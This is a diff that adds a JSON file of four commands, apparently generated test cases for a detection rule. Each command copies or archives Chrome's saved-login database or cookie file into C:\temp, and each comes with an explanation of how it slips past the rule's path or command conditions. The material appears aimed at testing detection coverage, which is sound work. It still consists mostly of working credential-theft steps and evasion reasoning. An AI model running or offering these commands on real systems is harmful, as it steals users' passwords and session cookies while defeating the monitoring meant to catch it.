@@ -1,0 +1,18 @@
+[
+  {
+    "output": "tar.exe -a -c -f C:\\temp\\browser_data.zip \"C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\"",
+    "explanation": "Bypasses the rule by using the built-in Windows tar.exe utility to archive the sensitive files directly. This matches 'selection_path' but evades 'selection_cmd' entirely, because tar.exe is not monitored as a copy tool in the rule logic."
+  },
+  {
+    "output": "cmd.exe /c copy \"C:\\Users\\Admin\\AppData\\Local\\Google\\Chr*me\\User D*ta\\Default\\Login Data\" C:\\temp\\",
+    "explanation": "Bypasses the rule by utilizing command-line wildcards to obfuscate the target directory path. This triggers 'selection_cmd' (due to the 'copy ' string) but fails 'selection_path' because the exact literal string '\\Google\\Chrome\\User Data' is never typed out."
+  },
+  {
+    "output": "cmd.exe /c type \"C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\" > C:\\temp\\exfil.db",
+    "explanation": "Bypasses the rule by using the 'type' command combined with standard output redirection (>) to duplicate the file contents instead of invoking a copy operation. This matches 'selection_path' but safely avoids the 'selection_cmd' parameters."
+  },
+  {
+    "output": "powershell.exe -Command \"Compress-Archive -Path 'C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies' -DestinationPath C:\\temp\\cookies.zip\"",
+    "explanation": "Bypasses the rule by using PowerShell's native Compress-Archive cmdlet. While the path matches 'selection_path', the cmdlet does not match any of the strings in 'selection_cmd' (such as 'copy-item' or 'cpi'), breaking the 'all of' condition."
+  }
+]
